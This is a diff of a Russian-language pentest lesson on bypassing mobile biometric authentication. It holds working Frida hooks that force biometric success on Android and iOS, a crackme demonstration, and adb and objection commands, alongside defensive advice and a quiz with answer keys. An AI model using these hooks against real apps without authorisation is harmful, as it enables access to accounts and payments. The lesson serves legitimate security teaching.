@@ -14,32 +14,74 @@ useful_for:
 estimated_minutes: 30
 summary: "Как приложения используют биометрию (BiometricPrompt, LocalAuthentication) и как обходить проверку через Frida-хуки; почему клиентская биометрия — не замена серверной аутентификации."
 ---
-## Введение
 
-Биометрия на мобильных устройствах — это **локальный** способ подтвердить, что устройство находится в руках владельца. Она не является серверным фактором аутентификации: приложение вызывает системный API (`BiometricPrompt` на Android, `LAContext`/Face ID/Touch ID на iOS), получает `true/false` и на основе этого решает, пускать ли пользователя дальше. Если решение принимается целиком на клиенте, его можно подделать хуком. Правильная архитектура подписывает операцию ключом из Keystore/Secure Enclave, но так делают редко.
+## Вопрос, с которого всё начинается
 
-Именно поэтому биометрия — классическая тема для логических обходов: она защищает от «подглядывания за паролем», но не от целенаправленной атаки на скомпрометированном устройстве.
+Мобильное приложение просит отпечаток пальца или Face ID, и после успеха открывает доступ к деньгам или приватным данным. Возникает вопрос: а что если «успех» — это просто `true`, который вернул системный API? Можно ли его подделать?
 
-## Как приложения используют биометрию
+В этом уроке мы разберём, где именно принимается решение о биометрии, и научимся подменять его. И покажем это вживую на маленькой программе-модели.
 
-Android (современный API):
+## Наш пример: проверка «свой/чужой» в коде
+
+Биометрия — это, по сути, булева проверка: «совпало или нет». Чтобы понять, как её обойти, возьмём нашу лабораторную программу `crackme` (мы собирали её в уроке про Frida). Она сравнивает введённый пароль с секретом через `strcmp`:
+
+```c
+if (strcmp(candidate, SECRET) == 0) {
+    printf("Success! Correct secret.\n");
+} else {
+    printf("Nope, try again.\n");
+}
+```
+
+Запустим её с неправильным паролем — контрольный прогон:
+
+```
+$ ./crackme totally-wrong
+Nope, try again.
+```
+
+Проверка «не прошла». Теперь то же самое, но с хуком Frida, который подменяет результат `strcmp` на «совпало»:
+
+```javascript
+const f = Module.getGlobalExportByName("strcmp");
+Interceptor.attach(f, {
+  onLeave(retval) {
+    console.log("[*] original strcmp result = " + retval.toInt32());
+    retval.replace(0);            // force "equal"
+  }
+});
+```
+
+Запускаем и смотрим вывод:
+
+```
+$ python3 force_ok.py
+Success! Correct secret.
+[*] original strcmp result = 61
+[+] forced strcmp result = 0 (match)
+```
+
+Пароль всё ещё неправильный (`totally-wrong`), но программа уверена, что он совпал. **Вот и вся суть обхода клиентской проверки**: если решение принимается в приложении, его результат можно подменить.
+
+## Шаг 1: как биометрия выглядит в коде
+
+Современный Android использует `BiometricPrompt` — системный диалог, который показывает отпечаток/лицо и возвращает приложению результат через колбэк:
 
 ```java
 BiometricPrompt prompt = new BiometricPrompt(activity, executor,
     new BiometricPrompt.AuthenticationCallback() {
         public void onAuthenticationSucceeded(AuthenticationResult r) {
-            unlockVault(); // критичное действие здесь
+            unlockVault();   // критичное действие — здесь
         }
     });
 prompt.authenticate(new BiometricPrompt.PromptInfo.Builder()
     .setTitle("Вход").build());
 ```
 
-iOS:
+На iOS аналог — `LAContext`:
 
 ```swift
 let ctx = LAContext()
-var err: NSError?
 if ctx.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &err) {
     ctx.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
         localizedReason: "Вход") { ok, _ in
@@ -48,140 +90,18 @@ if ctx.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &err) 
 }
 ```
 
-Уязвимость: и `onAuthenticationSucceeded`, и `evaluatePolicy` возвращают булево, которое можно подменить. Если после успеха приложение просто выставляет флаг `isAuthenticated = true` и хранит его в памяти, обход тривиален.
+В обоих случаях приложение получает булево (`onAuthenticationSucceeded` или `ok`) и само решает, что делать. Это и есть слабое место — как `strcmp` в нашей модели.
 
-## Обход через Frida (Android)
+## Шаг 2: обход на Android
 
-```javascript
-Java.perform(function () {
-  // 1) форсировать успех в колбэке
-  var CB = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
-  CB.onAuthenticationSucceeded.implementation = function (result) {
-    console.log('[+] forcing biometric success');
-    return this.onAuthenticationSucceeded(result);
-  };
-  // 2) подделать доступность биометрии
-  var BM = Java.use('android.hardware.biometrics.BiometricManager');
-  BM.canAuthenticate.overload('int').implementation = function (m) { return 0; };
-});
+Первый подход — хукать системный колбэк. Но на практике проще искать **собственную обёртку** приложения: разработчики часто заворачивают биометрию в свой метод вроде `isBiometricValid()` или `checkFingerprint()`. Ищем её в декомпилированном коде:
+
+```
+$ grep -rn "BiometricPrompt\|FingerprintManager\|isAuthenticated\|biometric" jadx_out/ | head
+com/target/security/BiometricHelper.java:  public boolean isAuthenticated() { ... }
 ```
 
-Часто проще найти в приложении собственный метод-обёртку (`isBiometricValid`, `checkFingerprint`) и вернуть `true`:
-
-```javascript
-var Cls = Java.use('com.target.security.BiometricHelper');
-Cls.isBiometricValid.overload().implementation = function () { return true; };
-```
-
-Обёртку ищите в декомпилированном коде: `grep -rn "Biometric\|Fingerprint\|isAuthenticated" jadx_out/`.
-
-## Обход на iOS
-
-```javascript
-var LA = ObjC.classes.LAContext;
-Interceptor.attach(LA['- evaluatePolicy:localizedReason:reply:'].implementation, {
-  onEnter: function (args) {
-    var reply = new ObjC.Block(args[4]);
-    reply.implementation = function (success, error) {
-      reply(true, NULL);   // всегда успех
-    };
-  }
-});
-```
-
-Objection делает то же одной командой: `ios ui biometrics_bypass`.
-
-## Где именно «настоящая» проверка
-
-Ключевой вопрос пентеста: доверяет ли сервер клиентскому «я прошёл биометрию»? Если да — обход даёт полный доступ. Если критичное действие требует подписи ключом Keystore/Secure Enclave с `setUserAuthenticationRequired(true)` — подделать сложнее (нужен сам ключ). Проверьте:
-
-- есть ли `setUserAuthenticationRequired`/`kSecAccessControlBiometryAny`;
-- не хранится ли флаг аутентификации в SharedPreferences/Keychain без защиты;
-- не уходит ли на сервер голое `biometric=true` без доказательства.
-
-## Разобранный пример
-
-Банк: после Face ID открывается список карт; сервер не перепроверяет. Пентестер хукает `LAContext.evaluatePolicy` → получает доступ к картам и операциям без биометрии. Отчёт: обход биометрической аутентификации, критичное действие защищено только клиентским флагом.
-
-## Частые ошибки и подводные камни
-
-- Хукать системный API, когда у приложения есть своя обёртка — ищите её первой (проще и стабильнее).
-- Забыть, что `canEvaluatePolicy`/`canAuthenticate` может возвращать `false` на эмуляторе — это не уязвимость.
-- Считать обход биометрии шумом: это high, если за ним стоят деньги/данные.
-- Не проверить серверную сторону — там может быть вторая проверка (тогда обход не даёт доступа).
-- Игнорировать device-credential fallback (`deviceOwnerAuthentication` вместо `...WithBiometrics`), который принимает PIN вместо биометрии.
-
-## Справочная таблица
-
-| Платформа | API | Хук обхода |
-|-----------|-----|-----------|
-| Android | `BiometricPrompt` | callback / обёртка |
-| Android | `BiometricManager` | `canAuthenticate` |
-| iOS | `LAContext` | `evaluatePolicy` |
-| iOS | Keychain | `kSecAccessControlBiometryAny` |
-| Оба | серверный фактор | проверить, что именно уходит |
-
-## Что делать дальше / решение
-
-- **Обёртка возвращает bool** → хукайте её, зафиксируйте PoC.
-- **Флаг в SharedPreferences/Keychain** → покажите, что его можно выставить вручную.
-- **Ключ Keystore с `setUserAuthenticationRequired`** → попробуйте подпись с device-credential fallback или ищите обход на root.
-- **Сервер перепроверяет** → зафиксируйте как «клиентский обход не даёт доступа» и переходите к другим векторам.
-- Severity: доступ к деньгам/данным через обход — High/Critical; обход без последствий — Low.
-
-## Локальная аутентификация vs серверная: где проходит граница
-
-Разберитесь, что именно защищает биометрия в конкретном приложении:
-
-- **Только локальный экран:** биометрия открывает раздел, данные приходят с сервера по уже валидному токену. Обход = доступ к разделу (High, если там деньги/данные).
-- **Разблокировка ключа:** биометрия разблокирует ключ в Keystore/Keychain, которым подписывается операция. Обход без ключа невозможен — это правильная модель.
-- **Подтверждение операции:** сервер требует свежую аутентификацию (step-up). Обход локального флага не поможет, если сервер проверяет криптоподпись.
-
-Проверьте на сервере: уходит ли голое `biometric=true`, или подпись/attestation. Если голое — находка.
-
-## Тестирование через device-credential fallback
-
-Многие приложения используют `deviceOwnerAuthentication` (биометрия ИЛИ PIN) вместо `...WithBiometrics`. Тогда вместо биометрии можно ввести PIN — но это ожидаемое поведение. Однако если приложение считает, что «биометрия прошла», хотя пользователь ввёл PIN, — это логическая неточность. Проверяйте, какой policy реально используется:
-
-```bash
-grep -rn "deviceOwnerAuthentication\|WithBiometrics\|BIOMETRIC_STRONG\|BIOMETRIC_WEAK" jadx_out/ | head
-```
-
-## Обход через подмену флага состояния
-
-Частая ошибка — хранить результат биометрии в памяти или в SharedPreferences:
-
-```javascript
-// приложение хранит флаг
-SharedPreferences prefs = ...; prefs.edit().putBoolean("bio_ok", true).apply();
-```
-
-Проверка: можно ли выставить флаг вручную (root/run-as для debuggable) и получить доступ без биометрии:
-
-```bash
-adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/state.xml
-```
-
-Если `bio_ok=true` даёт доступ — модель сломана.
-
-## Рекомендации по защите
-
-- Привязывать критичные ключи к аутентификации (`setUserAuthenticationRequired(true)`, `kSecAccessControlBiometryAny`).
-- Не доверять клиентскому булеву; требовать серверную проверку/подпись.
-- Использовать `BIOMETRIC_STRONG` и `CryptoObject` в `BiometricPrompt`.
-- Не хранить флаг аутентификации в открытом виде; сбрасывать его при сворачивании приложения.
-- Не логировать биометрические события и не передавать их как «доказательство».
-
-## Практический PoC обхода биометрии (Android)
-
-Пошаговый сценарий для отчёта:
-
-```bash
-# 1) найти обёртку биометрии в декомпилированном коде
-grep -rn "BiometricPrompt\|FingerprintManager\|isAuthenticated\|biometric" jadx_out/ | head
-# 2) подключиться Frida и захукать обёртку
-frida -U -f com.target.app -l bypass.js
-```
+И возвращаем `true`:
 
 ```javascript
 Java.perform(function () {
@@ -193,22 +113,102 @@ Java.perform(function () {
 });
 ```
 
-Затем переходим на защищённый экран и убеждаемся, что доступ получен без отпечатка/лица. Фиксируем: экран, действие, отсутствие серверной проверки.
+Подключаемся: `frida -U -f com.target.app -l bypass.js`. Переходим на защищённый экран — доступ получен без отпечатка.
 
-## Проверка серверной перепроверки
+## Шаг 3: обход на iOS
 
-Чтобы понять, действительно ли обход даёт доступ, проверьте, что происходит после локального «успеха»: уходит ли на сервер подписанный запрос или просто токен сессии. Если сервер выдаёт данные по существующему токену — модель клиентская, обход эффективен. Если сервер требует свежую подпись ключа — обход не даёт доступа, и это правильная архитектура.
+На iOS подменяем reply-блок `evaluatePolicy`, чтобы он всегда сообщал успех:
 
-```bash
-# смотрим трафик после «успешной» биометрии
-mitmproxy -p 8080   # + pinning bypass при необходимости
+```javascript
+var LA = ObjC.classes.LAContext;
+Interceptor.attach(LA['- evaluatePolicy:localizedReason:reply:'].implementation, {
+  onEnter: function (args) {
+    var reply = new ObjC.Block(args[4]);
+    reply.implementation = function (success, error) { reply(true, NULL); };
+  }
+});
 ```
 
-## Итоговая оценка
+Objection делает то же одной командой: `ios ui biometrics_bypass`.
 
-Обход биометрии — это не «взлом», а демонстрация того, что защита критичного действия построена на клиентском решении. Ценность находки определяется последствиями: доступ к платежам, персональным данным или приватным ключам повышает severity до High/Critical; доступ к некритичному экрану — до Medium/Low.
+## Шаг 4: главный вопрос — где настоящая проверка
+
+Обход локального булева — это ещё не победа. Надо понять, **что защищает биометрия** в конкретном приложении:
+
+- **Только локальный экран.** Биометрия открывает раздел, а данные приходят по уже валидному токену. Обход даёт доступ к разделу — High, если там деньги/данные.
+- **Разблокировка ключа.** Биометрия разблокирует ключ в Keystore/Secure Enclave, которым подписывается операция. Без ключа подделать нельзя — это правильная модель.
+- **Step-up на сервере.** Сервер требует свежую подпись/attestation. Локальный флаг не поможет.
+
+Проверьте, не уходит ли на сервер голое `biometric=true` без доказательства. Если уходит — находка.
+
+## Шаг 5: флаг состояния в хранилище
+
+Частая ошибка — хранить результат биометрии в `SharedPreferences` или памяти:
+
+```java
+prefs.edit().putBoolean("bio_ok", true).apply();
+```
+
+Проверяем, даёт ли выставленный вручную флаг доступ (на debuggable/root):
+
+```
+$ adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/state.xml
+<boolean name="bio_ok" value="true" />
+```
+
+Если `bio_ok=true` открывает доступ — модель сломана. Ещё проверьте, какой policy используется: `deviceOwnerAuthentication` (биометрия ИЛИ PIN) вместо `...WithBiometrics` принимает PIN — это fallback, но иногда приложение считает, что «биометрия прошла», хотя ввели PIN.
+
+## Полный прогон от начала до конца
+
+Соберём обход в один сценарий для банковского приложения `SecureBank`:
+
+1. **`jadx`** — декомпилируем и ищем `Biometric`/`isAuthenticated`.
+2. **Находим обёртку** — например, `SecureBankSecurity.isFingerprintValid()`.
+3. **Запускаем под Frida** с хуком, возвращающим `true`.
+4. **Открываем экран «Мои карты»** — он больше не спрашивает отпечаток.
+5. **Проверяем действие** — например, перевод. Уходит ли на сервер подпись или обычный токен?
+6. **Фиксируем доказательство** — скриншот доступа, лог хука, отсутствие серверной перепроверки.
+
+Ключевой момент — шаг 5. Если сервер принял операцию по существующему токену, обход даёт реальный доступ и severity высокий. Если сервер потребовал свежую криптоподпись и отказал — обход лишь показал слабость локальной модели, но деньги не ушли.
+
+## Если не сработало
+
+- **`canAuthenticate`/`canEvaluatePolicy` возвращает `false` на эмуляторе.** Это не уязвимость, а отсутствие биометрии в среде. Тестируйте на реальном устройстве или эмуляторе с настроенным отпечатком.
+- **Ключ привязан к аутентификации.** Если `CryptoObject` построен на ключе с `setUserAuthenticationRequired(true)`, подмена колбэка не даст подписать операцию. Тогда ищите обход на root (разблокировать ключ) или другой вектор.
+- **Сервер перепроверяет.** Если после локального «успеха» сервер требует подпись и отклоняет запрос — задокументируйте это как правильную модель и переходите дальше.
+- **Обёртки нет.** Приложение вызывает системный API напрямую — хукайте `AuthenticationCallback.onAuthenticationSucceeded`, но помните: успех колбэка ещё не значит, что критичное действие выполнено.
+- **Fallback на PIN.** `deviceOwnerAuthentication` принимает PIN. Если приложение считает, что «прошла биометрия», хотя ввели PIN, — это логическая неточность, но не полный обход.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. Биометрия в приложении — это булева проверка, результат которой возвращается в клиент.
+2. Клиентскую проверку можно подменить хуком — как `strcmp` в нашей модели.
+3. Проще хукать собственную обёртку приложения (`isAuthenticated`), чем системный API.
+4. Обход опасен, только если критичное действие не защищено сервером или ключом Keystore.
+5. Правильная защита — `setUserAuthenticationRequired(true)` и `CryptoObject`, а не голый флаг.
+
+## Как это защищать
+
+Правильная модель строится на трёх правилах:
+
+- **Привязывать ключ к аутентификации.** `setUserAuthenticationRequired(true)` на Android и `kSecAccessControlBiometryAny` на iOS не дадут использовать ключ без биометрии.
+- **Не доверять клиенту.** Сервер должен проверять подпись или attestation, а не принимать голое `biometric=true`.
+- **Не хранить флаг в открытом виде.** Сбрасывайте `bio_ok` при сворачивании приложения и не кладите его в незащищённые SharedPreferences.
+
+Если хотя бы одного правила нет — биометрия превращается в декорацию, которую снимает пара строк Frida.
+
+## На что смотреть дальше
+
+- **Ищите обёртку** биометрии в декомпилированном коде — это самая надёжная точка хука.
+- **Проверяйте серверную перепроверку:** уходит ли подпись или просто токен.
+- **Смотрите на policy:** `WithBiometrics` vs `deviceOwnerAuthentication`.
+- **Проверяйте хранилище флага:** `bio_ok` в SharedPreferences — красный флаг.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Почему клиентскую биометрию можно обойти?"
@@ -218,7 +218,6 @@ mitmproxy -p 8080   # + pinning bypass при необходимости
     - "Она использует TLS"
     - "Она хранится в Keychain"
   answer: 0
-  explanation: "Если приложение само доверяет true/false, результат можно подменить хуком."
 - question: "Какой Android API используется для биометрии?"
   options:
     - "BiometricPrompt"
@@ -226,7 +225,6 @@ mitmproxy -p 8080   # + pinning bypass при необходимости
     - "AccountManager"
     - "TelephonyManager"
   answer: 0
-  explanation: "BiometricPrompt — современный API аутентификации по биометрии."
 - question: "Какой iOS-класс отвечает за локальную аутентификацию?"
   options:
     - "LAContext"
@@ -234,7 +232,6 @@ mitmproxy -p 8080   # + pinning bypass при необходимости
     - "NSURLSession"
     - "WKWebView"
   answer: 0
-  explanation: "LAContext.evaluatePolicy выполняет проверку Face ID/Touch ID."
 - question: "Что делает обход биометрии действительно опасным?"
   options:
     - "Критичное действие защищено только клиентским флагом"
@@ -242,7 +239,6 @@ mitmproxy -p 8080   # + pinning bypass при необходимости
     - "Устройство новое"
     - "Биометрия включена в настройках"
   answer: 0
-  explanation: "Без серверной проверки или подписи ключом обход даёт полный доступ."
 - question: "Какой флаг Keystore делает ключ недоступным без аутентификации пользователя?"
   options:
     - "setUserAuthenticationRequired(true)"
@@ -250,8 +246,11 @@ mitmproxy -p 8080   # + pinning bypass при необходимости
     - "setKeySize"
     - "setBlockMode"
   answer: 0
-  explanation: "Этот флаг привязывает использование ключа к успешной аутентификации."
 ```
+
+## Куда дальше
+
+Мы научились обходить локальные проверки — биометрию и подобные булевы решения. В следующем уроке разберём **клонирование приложений**: как создаются «двойники» (dual apps, parallel space) и почему это открывает новые каналы атаки. А пока запомни главное: подменяемо то, что решается в клиенте; ищите обёртку и проверяйте, доверяет ли ей сервер.
 
 ## Где пригодится
 
